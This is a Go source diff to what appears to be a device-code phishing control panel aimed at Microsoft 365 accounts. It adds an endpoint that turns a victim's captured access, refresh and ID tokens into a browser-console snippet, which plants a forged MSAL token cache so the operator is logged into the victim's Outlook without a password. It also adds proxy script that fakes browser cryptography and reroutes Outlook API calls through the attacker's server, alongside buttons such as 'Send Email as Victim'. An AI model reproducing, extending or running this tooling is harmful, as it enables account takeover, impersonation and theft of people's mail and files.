@@ -3,6 +3,7 @@ package core
 import (
 	"bytes"
 	"compress/gzip"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"html/template"
@@ -54,6 +55,7 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/dc/open/{token}", s.handleDCOpen).Methods("GET")
 	r.HandleFunc("/dc/send/{token}", s.handleDCSend).Methods("GET", "POST")
 	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
+	r.HandleFunc("/dc/inject/{token}", s.handleDCInject).Methods("GET")
 	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
 	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
 	// User panels
@@ -433,6 +435,7 @@ tr:hover td{background:#1e1e1e}
 %s
 <p class="sect">Account Access</p>
 <div class="actions">
+<a class="btn b3" href="/dc/inject/%s" target="_blank">Inject Browser Session</a>
 <a class="btn b3" href="/dc/open/%s" target="_blank">Open Full OWA</a>
 <a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
 <a class="btn b2" href="/dc/drive/%s">OneDrive Files</a>
@@ -466,10 +469,11 @@ function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('o
 		template.HTMLEscapeString(u.JobTitle),
 		template.HTMLEscapeString(u.Department),
 		sentBanner,
-		template.HTMLEscapeString(landingToken),
-		template.HTMLEscapeString(landingToken),
-		template.HTMLEscapeString(landingToken),
-		template.HTMLEscapeString(landingToken),
+		template.HTMLEscapeString(landingToken), // inject
+		template.HTMLEscapeString(landingToken), // open owa
+		template.HTMLEscapeString(landingToken), // send
+		template.HTMLEscapeString(landingToken), // drive
+		template.HTMLEscapeString(landingToken), // inbox
 		template.HTMLEscapeString(u.DisplayName),
 		template.HTMLEscapeString(u.Mail),
 		template.HTMLEscapeString(u.JobTitle),
@@ -729,28 +733,59 @@ func (s *HttpServer) handleDCOWA(w http.ResponseWriter, r *http.Request) {
 	proxyBase := "/dc/owa/" + sessID
 	rawBody = owaRewrite(rawBody, sessID, ct)
 
-	// Inject a small JS shim into HTML pages so OWA constructs relative URLs
-	// using our proxy base instead of the real hostname.
+	// Inject shims into HTML: crypto polyfill (required by MSAL over HTTP)
+	// + fetch/XHR URL rewrite so OWA API calls go through our proxy.
 	if strings.Contains(ct, "text/html") {
 		shim := fmt.Sprintf(`<script>
 (function(){
-  var _base=%q;
-  // Patch fetch so relative OWA calls go through proxy
-  var _fetch=window.fetch;
-  window.fetch=function(u,o){
-    if(typeof u==='string'&&u.startsWith('https://outlook.office')){
-      u=_base+u.replace(/https:\/\/outlook\.office(365)?\.com/,'');
+/* ── Crypto polyfill for non-secure contexts (MSAL needs window.crypto.subtle) ── */
+if(!window.crypto||!window.crypto.subtle){
+  var _rv=function(a){for(var i=0;i<a.length;i++)a[i]=Math.floor(Math.random()*256);return a;};
+  /* Minimal SHA-256 for PKCE code challenge */
+  function _sha256(buf){
+    var K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+           0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+           0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+           0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+           0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+           0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+           0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+           0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+    var H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+    var data=new Uint8Array(buf);
+    var len=data.length,bitLen=len*8,padLen=((len%64)<56?56:120)-(len%64),msg=new Uint8Array(len+padLen+8);
+    msg.set(data);msg[len]=0x80;
+    for(var i=0;i<8;i++)msg[len+padLen+7-i]=(bitLen/(Math.pow(2,i*8)))&0xff;
+    for(var chunk=0;chunk<msg.length;chunk+=64){
+      var w=new Array(64);
+      for(var j=0;j<16;j++)w[j]=(msg[chunk+j*4]<<24)|(msg[chunk+j*4+1]<<16)|(msg[chunk+j*4+2]<<8)|msg[chunk+j*4+3];
+      for(var j=16;j<64;j++){var s0=((w[j-15]>>>7)|(w[j-15]<<25))^((w[j-15]>>>18)|(w[j-15]<<14))^(w[j-15]>>>3);var s1=((w[j-2]>>>17)|(w[j-2]<<15))^((w[j-2]>>>19)|(w[j-2]<<13))^(w[j-2]>>>10);w[j]=(w[j-16]+s0+w[j-7]+s1)>>>0;}
+      var a=H[0],b=H[1],c=H[2],d=H[3],e=H[4],f=H[5],g=H[6],h=H[7];
+      for(var j=0;j<64;j++){var S1=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));var ch=(e&f)^(~e&g);var temp1=(h+S1+ch+K[j]+w[j])>>>0;var S0=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));var maj=(a&b)^(a&c)^(b&c);var temp2=(S0+maj)>>>0;h=g;g=f;f=e;e=(d+temp1)>>>0;d=c;c=b;b=a;a=(temp1+temp2)>>>0;}
+      H[0]=(H[0]+a)>>>0;H[1]=(H[1]+b)>>>0;H[2]=(H[2]+c)>>>0;H[3]=(H[3]+d)>>>0;H[4]=(H[4]+e)>>>0;H[5]=(H[5]+f)>>>0;H[6]=(H[6]+g)>>>0;H[7]=(H[7]+h)>>>0;
     }
-    return _fetch(u,o);
+    var out=new Uint8Array(32);for(var i=0;i<8;i++){out[i*4]=H[i]>>>24;out[i*4+1]=(H[i]>>>16)&0xff;out[i*4+2]=(H[i]>>>8)&0xff;out[i*4+3]=H[i]&0xff;}
+    return out.buffer;
+  }
+  var subtle={
+    digest:function(a,d){return Promise.resolve(_sha256(d));},
+    generateKey:function(a,e,u){var k={type:'secret',_r:_rv(new Uint8Array(32))};return Promise.resolve({privateKey:k,publicKey:k});},
+    exportKey:function(f,k){if(f==='jwk')return Promise.resolve({kty:'oct',k:btoa(String.fromCharCode.apply(null,k._r||new Uint8Array(32))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'')});return Promise.resolve((k._r||new Uint8Array(32)).buffer);},
+    importKey:function(f,d,a,e,u){return Promise.resolve({type:'secret',algorithm:a});},
+    sign:function(){return Promise.resolve(new Uint8Array(32).buffer);},
+    verify:function(){return Promise.resolve(true);},
+    encrypt:function(a,k,d){return Promise.resolve(d instanceof ArrayBuffer?d:d.buffer);},
+    decrypt:function(a,k,d){return Promise.resolve(d instanceof ArrayBuffer?d:d.buffer);}
   };
-  // Patch XHR open
-  var _open=XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open=function(m,u){
-    if(typeof u==='string'&&u.startsWith('https://outlook.office')){
-      u=_base+u.replace(/https:\/\/outlook\.office(365)?\.com/,'');
-    }
-    return _open.apply(this,arguments);
-  };
+  if(!window.crypto)window.crypto={subtle:subtle,getRandomValues:_rv};
+  else window.crypto.subtle=subtle;
+  try{Object.defineProperty(window,'isSecureContext',{value:true,writable:false,configurable:true});}catch(e){}
+}
+/* ── URL rewrite: send OWA API calls through our proxy ── */
+var _base=%q;
+var _fix=function(u){return(typeof u==='string'&&/^https:\/\/outlook\.office(365)?\.com/.test(u))?_base+u.replace(/^https:\/\/outlook\.office(365)?\.com/,''):u;};
+var _fetch=window.fetch;window.fetch=function(u,o){return _fetch(_fix(u),o);};
+var _xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){return _xo.apply(this,[m,_fix(u)].concat(Array.prototype.slice.call(arguments,2)));};
 })();
 </script>`, proxyBase)
 		rawBody = bytes.Replace(rawBody, []byte("<head>"), []byte("<head>"+shim), 1)
@@ -941,6 +976,290 @@ a{color:#0078d4}
 func jsonQ(s string) string {
 	b, _ := json.Marshal(s)
 	return string(b)
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// MSAL token-cache injection — /dc/inject/{token}
+//
+// Generates a JavaScript snippet the admin pastes into the browser console
+// while on https://outlook.office.com/mail/.  MSAL finds the pre-populated
+// localStorage cache on boot, uses silent auth (no crypto / PKCE needed),
+// and the admin is fully logged in as the victim.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// decodeJWTClaims base64-decodes the JWT payload without verifying the signature.
+func decodeJWTClaims(token string) map[string]interface{} {
+	parts := strings.Split(token, ".")
+	if len(parts) < 2 {
+		return nil
+	}
+	// JWT uses unpadded base64url
+	b, err := base64.RawURLEncoding.DecodeString(parts[1])
+	if err != nil {
+		return nil
+	}
+	var claims map[string]interface{}
+	json.Unmarshal(b, &claims)
+	return claims
+}
+
+func jwtStr(m map[string]interface{}, key string) string {
+	if m == nil {
+		return ""
+	}
+	if v, ok := m[key].(string); ok {
+		return v
+	}
+	return ""
+}
+
+// extractOWAClientID fetches the OWA boot HTML and extracts the MSAL clientId
+// from the embedded JSON boot config.  Falls back to the known OWA value.
+func extractOWAClientID(at string) string {
+	req, err := http.NewRequest("GET", "https://outlook.office.com/mail/", nil)
+	if err != nil {
+		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+	}
+	req.Header.Set("Authorization", "Bearer "+at)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36")
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+
+	re := regexp.MustCompile(`"clientId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"`)
+	if m := re.FindSubmatch(body); len(m) > 1 {
+		return string(m[1])
+	}
+	return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+}
+
+func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
+	tgt := GetTargetByToken(mux.Vars(r)["token"])
+	if tgt == nil {
+		http.NotFound(w, r)
+		return
+	}
+	tgt.mu.Lock()
+	at := tgt.AccessToken
+	rt := tgt.RefreshToken
+	idt := tgt.IDToken
+	tenant := tgt.Tenant
+	email := tgt.Email
+	landingToken := tgt.LandingToken
+	tgt.mu.Unlock()
+
+	if at == "" {
+		http.Error(w, "no token captured yet — victim has not approved", http.StatusBadRequest)
+		return
+	}
+
+	// Get an OWA-scoped access token via FOCI refresh
+	owaAT := at
+	owaRT := rt
+	if rt != "" {
+		if a, newRT, err := RefreshForScope(rt, tenant, "https://outlook.office.com/.default openid profile email offline_access"); err == nil {
+			owaAT = a
+			if newRT != "" {
+				owaRT = newRT
+			}
+		}
+	}
+
+	// Extract claims from ID token, fall back to access token
+	claims := decodeJWTClaims(idt)
+	if claims == nil {
+		claims = decodeJWTClaims(owaAT)
+	}
+
+	oid := jwtStr(claims, "oid")
+	tid := jwtStr(claims, "tid")
+	if tid == "" {
+		tid = tenant
+	}
+	upn := jwtStr(claims, "preferred_username")
+	if upn == "" {
+		upn = jwtStr(claims, "upn")
+	}
+	if upn == "" {
+		upn = email
+	}
+	name := jwtStr(claims, "name")
+	if name == "" {
+		name = upn
+	}
+
+	// Build MSAL v2 home account ID
+	homeAccountID := strings.ToLower(oid + "." + tid)
+	env := "login.microsoftonline.com"
+
+	// Extract OWA's own MSAL client ID from its boot HTML
+	owaClientID := extractOWAClientID(owaAT)
+
+	// Build client_info (base64url of {"uid":"oid","utid":"tid"})
+	ciRaw, _ := json.Marshal(map[string]string{"uid": oid, "utid": tid})
+	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)
+
+	scope := "https://outlook.office.com/.default openid profile email offline_access"
+	if sc := jwtStr(claims, "scp"); sc != "" {
+		scope = sc
+	}
+
+	now := fmt.Sprintf("%d", time.Now().Unix())
+	exp := fmt.Sprintf("%d", time.Now().Unix()+3600)
+	extExp := fmt.Sprintf("%d", time.Now().Unix()+86400)
+
+	// MSAL v2 cache key format (all lowercase, separator "-"):
+	//   account : {homeAccountId}-{env}-{realm}
+	//   at      : {homeAccountId}-{env}-accesstoken-{clientId}-{realm}-{target}--
+	//   rt      : {homeAccountId}-{env}-refreshtoken-{clientId}--{target}--
+	//   idt     : {homeAccountId}-{env}-idtoken-{clientId}-{realm}--
+	accountKey := strings.ToLower(fmt.Sprintf("%s-%s-%s", homeAccountID, env, tid))
+	atKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, scope))
+	rtKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, scope))
+	idtKey := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, owaClientID, tid))
+
+	idtClaimsJSON, _ := json.Marshal(claims)
+
+	accountVal := map[string]interface{}{
+		"authorityType":  "MSSTS",
+		"clientInfo":     clientInfo,
+		"environment":    env,
+		"homeAccountId":  homeAccountID,
+		"idTokenClaims":  json.RawMessage(idtClaimsJSON),
+		"localAccountId": oid,
+		"name":           name,
+		"realm":          tid,
+		"username":       upn,
+		"tenantProfiles": []map[string]string{
+			{"localAccountId": oid, "name": name, "realm": tid},
+		},
+	}
+	atVal := map[string]interface{}{
+		"cachedAt":          now,
+		"clientId":          owaClientID,
+		"credentialType":    "AccessToken",
+		"environment":       env,
+		"expiresOn":         exp,
+		"extendedExpiresOn": extExp,
+		"homeAccountId":     homeAccountID,
+		"realm":             tid,
+		"secret":            owaAT,
+		"target":            scope,
+		"tokenType":         "Bearer",
+	}
+	rtVal := map[string]interface{}{
+		"clientId":       owaClientID,
+		"credentialType": "RefreshToken",
+		"environment":    env,
+		"homeAccountId":  homeAccountID,
+		"secret":         owaRT,
+		"target":         scope,
+	}
+	idtVal := map[string]interface{}{
+		"clientId":       owaClientID,
+		"credentialType": "IdToken",
+		"environment":    env,
+		"homeAccountId":  homeAccountID,
+		"realm":          tid,
+		"secret":         idt,
+	}
+
+	entries := map[string]interface{}{
+		accountKey: accountVal,
+		atKey:      atVal,
+		rtKey:      rtVal,
+		idtKey:     idtVal,
+	}
+
+	// Build the JS snippet
+	var js strings.Builder
+	js.WriteString("(function(){\n")
+	for k, v := range entries {
+		vb, _ := json.Marshal(v)
+		// json.Marshal the key and value so they're safe to embed
+		kb, _ := json.Marshal(k)
+		js.WriteString(fmt.Sprintf("  localStorage.setItem(%s, %s);\n", kb, string(vb)))
+	}
+	js.WriteString(`  console.log('%c✓ Tokens injected', 'color:green;font-weight:bold');` + "\n")
+	js.WriteString("  location.reload();\n")
+	js.WriteString("})();")
+
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>Session Inject — %s</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
+h1{font-size:18px;color:#fff;margin-bottom:4px}
+.sub{font-size:12px;color:#666;margin-bottom:20px}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
+h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
+.steps{list-style:none;counter-reset:s}
+.steps li{counter-increment:s;padding:8px 0 8px 36px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
+.steps li:last-child{border-bottom:none}
+.steps li::before{content:counter(s);position:absolute;left:0;top:8px;background:#0078d4;color:#fff;width:22px;height:22px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:22px}
+.steps a{color:#0078d4}
+.code{background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:14px 16px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre-wrap;word-break:break-all;max-height:160px;overflow-y:auto;margin:10px 0 6px;cursor:pointer;user-select:all}
+.btn{padding:8px 20px;border-radius:4px;font-size:12px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;margin-right:8px}
+.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a;text-decoration:none;display:inline-block}
+.ok{color:#5cb85c;font-size:12px;display:none;margin-left:6px}
+.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
+</style></head><body>
+<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
+<h1>One-Click Browser Login</h1>
+<p class="sub">Inject victim session into Outlook Web — no password needed</p>
+<div class="card">
+<h2>Instructions</h2>
+<ol class="steps">
+<li>Open <a href="https://outlook.office.com/mail/" target="_blank">https://outlook.office.com/mail/</a> in your browser (unauthenticated)</li>
+<li>Open DevTools: press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Copy the snippet below and paste it into the console, then press Enter</li>
+<li>The page reloads — you are now logged in as <strong>%s</strong></li>
+</ol>
+</div>
+<div class="card">
+<h2>Paste into Browser Console (on outlook.office.com)</h2>
+<div class="code" id="snippet">%s</div>
+<button class="btn" onclick="copySnippet()">Copy Snippet</button>
+<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank">Open OWA</a>
+<span class="ok" id="ok">Copied!</span>
+</div>
+<div class="card">
+<h2>Details</h2>
+<div style="font-size:12px;color:#666;line-height:1.8">
+  <div>Target: <span style="color:#aaa">%s</span></div>
+  <div>OWA Client ID: <span style="color:#aaa">%s</span></div>
+  <div>Home Account: <span style="color:#aaa">%s</span></div>
+  <div>Scope: <span style="color:#aaa">%s</span></div>
+</div>
+</div>
+<script>
+var snippet = %q;
+function copySnippet(){
+  navigator.clipboard.writeText(snippet).then(function(){
+    var o=document.getElementById('ok');o.style.display='inline';
+    setTimeout(function(){o.style.display='none'},2000);
+  }).catch(function(){
+    document.getElementById('snippet').select();
+    document.execCommand('copy');
+  });
+}
+document.getElementById('snippet').addEventListener('click', copySnippet);
+</script>
+</body></html>`,
+		template.HTMLEscapeString(upn),
+		template.HTMLEscapeString(landingToken),
+		template.HTMLEscapeString(upn),
+		template.HTMLEscapeString(js.String()),
+		template.HTMLEscapeString(upn),
+		template.HTMLEscapeString(owaClientID),
+		template.HTMLEscapeString(homeAccountID),
+		template.HTMLEscapeString(scope),
+		js.String(),
+	)
 }
 
 // HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
